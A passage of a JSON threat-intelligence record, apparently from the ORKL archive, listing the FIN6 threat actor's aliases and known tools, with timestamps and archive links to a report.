            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "ea7bfe06-7c23-481d-b8ba-eafa6cda3bc9",
            "created_at": "2022-10-25T15:50:23.317961Z",
            "updated_at": "2025-03-27T02:00:55.440858Z",
            "deleted_at": null,
            "main_name": "FIN6",
            "aliases": [
                "FIN6",
                "Magecart Group 6",
                "ITG08",
                "Skeleton Spider",
                "TAAL",
                "Camouflage Tempest"
            ],
            "source_name": "MITRE:FIN6",
            "tools": [
                "FlawedAmmyy",
                "GrimAgent",
                "FrameworkPOS",
                "More_eggs",
                "Cobalt Strike",
                "Windows Credential Editor",
                "AdFind",
                "PsExec",
                "LockerGoga",
                "Ryuk",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673536149,
    "ts_updated_at": 1743041713,
    "ts_creation_date": 1653786749,
    "ts_modification_date": 1653786749,
    "files": {
        "pdf": "https://archive.orkl.eu/1e9ad934e87babf480135c91ac6febfa0d156fe9.pdf",
        "text": "https://archive.orkl.eu/1e9ad934e87babf480135c91ac6febfa0d156fe9.txt",
        "img": "https://archive.orkl.eu/1e9ad934e87babf480135c91ac6febfa0d156fe9.jpg"
    }
}